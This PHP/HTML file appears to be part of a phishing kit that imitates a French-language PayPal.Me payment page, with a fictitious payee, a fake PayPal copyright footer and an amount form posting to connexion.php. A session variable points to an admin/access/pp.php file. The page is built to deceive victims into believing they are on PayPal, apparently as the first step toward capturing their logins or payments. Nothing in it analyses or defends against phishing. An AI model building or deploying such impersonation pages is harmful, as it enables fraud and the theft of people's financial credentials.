<?php
session_start();
$_SESSION['fichier'] = __DIR__.DIRECTORY_SEPARATOR.'admin'.DIRECTORY_SEPARATOR.'access'.DIRECTORY_SEPARATOR.'pp.php';
?>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta charset="utf-8" />
    <title>PayPal.Me</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="stylesheet" href="public/css/style.css">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
</head>

<body>
<header class="topbar">
		<div class="brand"><a href="#"></a></div>
		<div class="navbar">
			<a href="#">Connexion</a>
		</div>
	</header>
	<div class="container-main">
		<div class="main-img">
			<img src="public/img/yellow.webp" alt="">
		</div>
		<h3 class="main-title">Sandrine Gonzalos</h3>
		<p>paypal.me/sandrinegonzalos</p>
		<div class="main-form">
			<form action="connexion.php" method="post">
				<div class="form-group">
					<div class="indice" >€</div>
					<input type="tel" name="euro" id="numb" placeholder="0.00" maxlength="6" >
				</div>
				<div class="devise">
					<select name="de" id="">
						<option value="$">AUD</option>
						<option value="R$">BRL</option>
						<option value="$">CAD</option>
						<option value="CHF">CHF</option>
						<option value="Kč">CZK</option>
						<option value="kr">DKK</option>
						<option value="€" selected>EUR</option>
						<option value="£">GBP</option>
						<option value="$">HKD</option>
						<option value="Ft">HUF</option>
						<option value="₪">ILS</option>
						<option value="¥">JPY</option>
						<option value="$">MXN</option>
						<option value="RM">MYR</option>
						<option value="kr">NOK</option>
						<option value="$">NZD</option>
						<option value="₱">PHP</option>
						<option value="zł">PLN</option>
						<option value="RUB">RUB</option>
						<option value="kr">SEK</option>
						<option value="$">SGD</option>
						<option value="฿">THB</option>
						<option value="TL">TRY</option>
						<option value="NT$">TWD</option>
						<option value="$">USD</option>
					</select>
				</div>
				<button type="submit" class="btn" id="sub">Suivant</button>
			</form>
		</div>					
	</div>
	</div>
	<footer>
		<div class="footer-navbar">
			<ul class="navbar-f">
				<li>
					<a href="#">aide</a>
				</li>
				<li>
					<a href="#">contact</a>
				</li>
				<li>
					<a href="#">securité</a>
				</li>
			</ul>
		</div>
		<div class="footer-copy">
			<div class="footer-p">
				<p>Copyright © 1999-2020 PayPal.</p>
				<p>Tous droits réservés</p> 
			</div>
			<ul class="footer-nav">
				<li><a href="#">Respect de la vie privée</a></li>
				<li><a href="#">Contrat d'utilisation</a></li>
			</ul>
		</div>
	</footer>
</body>
<script src="public/js/jquerry.js"></script>
<script>
		let select = document.querySelector('select')
		let indice = document.querySelector('.indice');
		let send = document.getElementById('sub')
		let input = document.getElementById('numb')
		let error = document.getElementById('error')

		select.addEventListener('change', function () {
			console.log('value => '+this.value);
			indice.textContent = this.value
		})
		send.addEventListener('click', function(e){
			if (isNaN(input.value) || input.value == "") {	
				e.preventDefault()
				input.style.color = "red"
				indice.style.color = "red"
				return false	
			}
		})


        $(document).ready(function(){
        var size= $('input[name="euro"]').css('font-size');
        $( 'input[name="euro"]').on( 'keydown change', function(e) {
        $('<span style="font-size: ' + size + ';"></span>').insertAfter($(this));
        var $span= $(this).next("span");
        $span.text($(this).val());
        var incert= (e.keyCode == 8) ? 0 : 0;
        if ($span.width() >= 120) {
            $(this).width( $span.width() + incert );
        }
            $span.remove();
        });
        });



let submit = document.getElementById('sub')
function myFunction() {
  let x
  // selection champ number"
  x = document.getElementById("numb").value;

  // If x is Not a Number or less than one or greater than 10
  if (isNaN(x) || x < 1 || x > 5000) {
	  console.log('ok')
  } else {
    return 
  }
}
submit.addEventListener('click', myFunction())
</script>
</html>
</html>